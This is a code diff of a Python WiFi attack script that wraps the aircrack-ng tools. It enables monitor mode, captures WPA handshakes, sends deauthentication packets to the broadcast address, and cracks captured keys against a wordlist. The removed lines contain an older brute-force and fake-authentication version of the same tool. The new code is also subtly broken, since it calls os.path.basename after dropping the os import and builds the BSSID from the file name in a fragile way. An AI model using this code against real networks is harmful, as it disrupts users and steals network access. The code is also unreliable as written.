@@ -1,89 +1,87 @@
-import os
 import subprocess
-import hashlib
-import hmac
+import time
+import re
+from threading import Thread
 
-def hash_password(password):
-    """Hash the password using SHA256."""
-    return hashlib.sha256(password.encode()).hexdigest()
-
-def verify_password(hash, password):
-    """Verify the hashed password against the clear text password."""
-    return hmac.compare_digest(hash, hashlib.sha256(password.encode()).hexdigest())
-
-def wifi_bruteforce(iface, essid, password, timeout=10):
-    """Brute force WiFi password using wpa_supplicant."""
-    hashed_password = hash_password(password)
-    config = f"""
-    p2p_disabled=1
-    network={{
-        ssid="{essid}"
-        psk="{password}"
-    }}
-    """
-    with open("/tmp/bettercap-wpa-config.conf", "w") as f:
-        f.write(config)
-    
-    cmd = ["wpa_supplicant", "-i", iface, "-c", "/tmp/bettercap-wpa-config.conf"]
-    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+def enable_monitor_mode(iface):
+    """Enable monitor mode using airmon-ng"""
     try:
-        stdout, stderr = proc.communicate(timeout=timeout)
-        if b"key negotiation completed" in stdout:
-            print("Authentication successful!")
-            return True
-        else:
-            print("Authentication failed.")
-            return False
-    except subprocess.TimeoutExpired:
-        proc.kill()
-        print("Authentication timed out.")
+        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
+                      check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        result = subprocess.run(['sudo', 'airmon-ng', 'start', iface], 
+                               capture_output=True, text=True)
+        if "monitor mode enabled" in result.stdout:
+            new_iface = re.findall(r"\((.*?)\)", result.stdout)[-1]
+            print(f"[+] Monitor mode enabled on {new_iface}")
+            return new_iface
+        print("[-] Failed to enable monitor mode")
+        return None
+    except Exception as e:
+        print(f"[-] Error: {str(e)}")
+        return None
+
+def scan_networks(iface, duration=10):
+    """Scan for networks using airodump-ng"""
+    try:
+        print(f"[+] Scanning networks on {iface}...")
+        proc = subprocess.Popen(['sudo', 'airodump-ng', iface], 
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(duration)
+        proc.terminate()
+        return True
+    except Exception as e:
+        print(f"[-] Scan failed: {str(e)}")
         return False
 
-def start_fake_auth(iface, bssid, client):
-    """Perform fake authentication attack."""
-    cmd = ["aireplay-ng", "--fakeauth", "0", "-a", bssid, "-h", client, iface]
-    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout, stderr = proc.communicate()
-    if proc.returncode == 0:
-        print("Fake authentication successful!")
-    else:
-        print("Fake authentication failed:", stderr.decode())
+def capture_handshake(iface, bssid, channel, output_file):
+    """Capture WPA handshake using airodump-ng"""
+    try:
+        cmd = [
+            'sudo', 'airodump-ng',
+            '--bssid', bssid,
+            '--channel', channel,
+            '--write', output_file,
+            iface
+        ]
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return proc
+    except Exception as e:
+        print(f"[-] Handshake capture failed: {str(e)}")
+        return None
 
-def start_deauth(iface, bssid):
-    """Perform deauthentication attack."""
-    cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, iface]
-    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout, stderr = proc.communicate()
-    if proc.returncode == 0:
-        print("Deauthentication successful!")
-    else:
-        print("Deauthentication failed:", stderr.decode())
+def deauth_attack(iface, bssid, client='FF:FF:FF:FF:FF:FF', count=3):
+    """Perform deauthentication attack"""
+    try:
+        cmd = [
+            'sudo', 'aireplay-ng',
+            '--deauth', str(count),
+            '-a', bssid,
+            '-h', client,
+            iface
+        ]
+        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("[+] Deauthentication packets sent")
+        return True
+    except Exception as e:
+        print(f"[-] Deauth failed: {str(e)}")
+        return False
 
-def monitor_mode(iface):
-    """Enable monitor mode on the WiFi interface."""
-    subprocess.run(["ip", "link", "set", iface, "down"])
-    subprocess.run(["iw", iface, "set", "monitor", "none"])
-    subprocess.run(["ip", "link", "set", iface, "up"])
-    print(f"Monitor mode enabled on {iface}")
-
-def crack_password(cap_file, wordlist):
-    """Crack the password using aircrack-ng."""
-    cmd = ["aircrack-ng", "-w", wordlist, cap_file]
-    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout, stderr = proc.communicate()
-    if proc.returncode == 0:
-        print("Password cracked successfully!")
-        print(stdout.decode())
-    else:
-        print("Password cracking failed:", stderr.decode())
-        
-def scan_networks(iface):
-    """Scan for available WiFi networks using nmcli."""
-    cmd = ["nmcli", "device", "wifi", "list", "ifname", iface]
-    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout, stderr = proc.communicate()
-    if proc.returncode == 0:
-        print("Available networks:")
-        print(stdout.decode())
-    else:
-        print("WiFi scanning failed:", stderr.decode())
+def crack_handshake(cap_file, wordlist):
+    """Crack WPA handshake using aircrack-ng"""
+    try:
+        cmd = [
+            'sudo', 'aircrack-ng',
+            '-w', wordlist,
+            '-b', os.path.basename(cap_file).split('-')[1],
+            cap_file + '-01.cap'
+        ]
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        if "KEY FOUND!" in result.stdout:
+            key = re.search(r'\[(.*?)\]', result.stdout).group(1)
+            print(f"[+] Password found: {key}")
+            return key
+        print("[-] Password not found in wordlist")
+        return None
+    except Exception as e:
+        print(f"[-] Cracking failed: {str(e)}")
+        return None
